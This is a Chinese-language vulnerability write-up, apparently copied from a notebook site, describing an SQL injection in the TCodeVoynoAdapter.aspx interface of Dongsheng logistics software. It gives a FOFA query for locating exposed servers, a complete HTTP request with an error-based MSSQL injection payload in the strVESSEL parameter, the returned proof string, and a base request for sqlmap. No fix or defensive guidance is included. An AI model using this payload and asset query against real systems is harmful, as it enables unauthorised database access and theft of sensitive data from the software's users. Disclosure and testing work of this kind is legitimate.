# 东胜物流软件TCodeVoynoAdapter存在SQL注入漏洞

# 一、漏洞简介
东胜物流软件是一款致力于为客户提供IT支撑的 SOP， 帮助客户大幅提高工作效率，降低各个环节潜在风险的物流软件。东胜物流软件 TCodeVoynoAdapter接口处存在 SQL 注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
+ 东胜物流软件

# 三、资产测绘
+ fofa`fid="Z4c2hPCi5IR/AnH5vZXNSQ=="`
+ 特征

![1708936256348-8d7bf6c6-a3aa-4202-9f9c-a325885eef04.png](./img/rJIO5oV0sZk0LMxK/1708936256348-8d7bf6c6-a3aa-4202-9f9c-a325885eef04-580498.png)

# 四、漏洞复现
```plain
GET /FeeCodes/TCodeVoynoAdapter.aspx?mask=0&pos=0&strVESSEL=1'%20AND%202523%20IN%20(SELECT%20(CHAR(113)%2bCHAR(120)%2bCHAR(112)%2bCHAR(113)%2bCHAR(113)%2b(SELECT%20SUBSTRING((ISNULL(CAST((%20sys.fn_VarBinToHexStr(hashbytes('MD5','hello')))%20AS%20NVARCHAR(4000)),CHAR(32))),1,1024))%2bCHAR(113)%2bCHAR(122)%2bCHAR(107)%2bCHAR(113)%2bCHAR(113)))%20AND%20'uKco'%3d'uKco HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36
Accept-Encoding: gzip, deflate
Connection: close
```

![1708936295313-27c1ae9a-9893-4fe5-8287-1cbd0d00ebfa.png](./img/rJIO5oV0sZk0LMxK/1708936295313-27c1ae9a-9893-4fe5-8287-1cbd0d00ebfa-836040.png)

```plain
qxpqq0x5d41402abc4b2a76b9719d911017c592qzkqq
```

sqlmap

```plain
GET /FeeCodes/TCodeVoynoAdapter.aspx?mask=0&pos=0&strVESSEL=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36
Accept-Encoding: gzip, deflate
Connection: close
```

![1708936414718-79468349-55d8-47d5-95d9-14824ae2eb8d.png](./img/rJIO5oV0sZk0LMxK/1708936414718-79468349-55d8-47d5-95d9-14824ae2eb8d-485496.png)



> 更新: 2024-02-29 23:55:41  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mb0ycgqbf4y3x7lf>